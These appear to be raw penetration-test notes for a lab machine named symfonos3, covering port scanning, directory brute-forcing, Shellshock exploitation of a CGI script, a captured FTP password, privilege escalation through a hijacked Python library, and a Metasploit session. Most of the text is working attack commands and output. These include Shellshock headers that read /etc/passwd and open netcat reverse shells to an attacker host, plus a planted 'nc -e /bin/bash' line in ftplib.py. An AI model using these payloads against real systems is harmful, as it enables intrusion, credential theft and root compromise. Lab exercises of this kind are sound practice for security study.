```console

sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.48
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 14:43 CEST
Nmap scan report for 192.168.110.48
Host is up (0.00020s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:4A:0B:BF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.20 ms 192.168.110.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.01 seconds

```
gobuster dir -f -t 50 -x html -u http://192.168.110.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -f -t 50 -x html -u http://192.168.110.48/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404  http://192.168.110.48/FUZZ.php
   

ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10/FUZZ




```bash

echo -e "HEAD /cgi-bin/underworld HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.110.48 80
curl -s -H "user-agent: () { :; }; echo;  /bin/bash -c '/bin/nc 192.168.110.1 4444 -e /bin/sh'" http://192.168.110.48/cgi-bin/underworld
curl -s -H "user-agent: () { :; }; echo;  /bin/bash -c '/bin/nc 192.168.110.1 4455 -e /bin/sh'" http://192.168.110.48/cgi-bin/underworld
curl -s -H "User-Agent: () { :; }; echo;  /bin/bash -c 'ping -c 1 192.168.110.1'" http://192.168.110.48/cgi-bin/underworld
curl -s -H "User-Agent: () { :; }; echo;  /bin/bash -c 'id'" http://192.168.110.48/cgi-bin/underworld

```

$ cat underworld
cat underworld
#!/bin/bash

echo "Content-type: text/html";
echo ""

uptime

$ id  
id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)

2021/09/16 12:43:01 CMD: UID=0    PID=5203   | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt                                                                                                          
2021/09/16 12:44:01 CMD: UID=0    PID=5212   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2021/09/16 12:44:01 CMD: UID=0    PID=5211   | /usr/bin/curl --silent -I 127.0.0.1 
2021/09/16 12:44:01 CMD: UID=0    PID=5210   | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2021/09/16 12:44:01 CMD: UID=0    PID=5209   | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2021/09/16 12:44:01 CMD: UID=0    PID=5213   | proftpd: (accepting connections)               
2021/09/16 12:44:01 CMD: UID=0    PID=5214   | /usr/sbin/CRON -f 

python -c "import pty; pty.spawn('/bin/sh')"

tcpdump -vvv -i lo port ftp -c 10 -w  ftp.pcap


220 ProFTPD 1.3.5b Server (Debian) [::ffff:127.0.0.1]
USER hades
331 Password required for hades
PASS PTpZTfU4vxgzvRBE
230 User hades logged in

hades@symfonos3:/opt/ftpclient$ cat ftpclient.py 
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()



hades@symfonos3:~$ ls -al /opt/ftpclient/ftpclient.py 
-rw-r--r-- 1 root hades 262 Apr  6  2020 /opt/ftpclient/ftpclient.py


find / -type f -writable 2>/dev/null | grep -v '^/proc'| grep -v '^/sys'

hades@symfonos3:~$ ls -al /etc/python2.7/sitecustomize.py
-rwxrw-r-- 1 root gods 155 Sep 26  2018 /etc/python2.7/sitecustomize.py
hades@symfonos3:~$ ls -al /usr/lib/python2.7/ftplib.py
-rwxrw-r-- 1 root gods 37802 Sep 16 13:54 /usr/lib/python2.7/ftplib.py

Modify the file /usr/lib/python2.7/ftplib.py

import sys
import os
os.system("nc -e /bin/bash 192.168.110.1 1234")


python -c "import pty; pty.spawn('/bin/sh')"
# id
uid=0(root) gid=0(root) groups=0(root)
#



msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 192.168.110.48
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/underworld
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.110.1
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 192.168.110.1:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (984904 bytes) to 192.168.110.48
[*] Meterpreter session 1 opened (192.168.110.1:4444 -> 192.168.110.48:59564) at 2021-09-17 12:21:58 +0200

meterpreter > sysinfo
Computer     : 192.168.110.48
OS           : Debian 9.9 (Linux 4.9.0-9-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >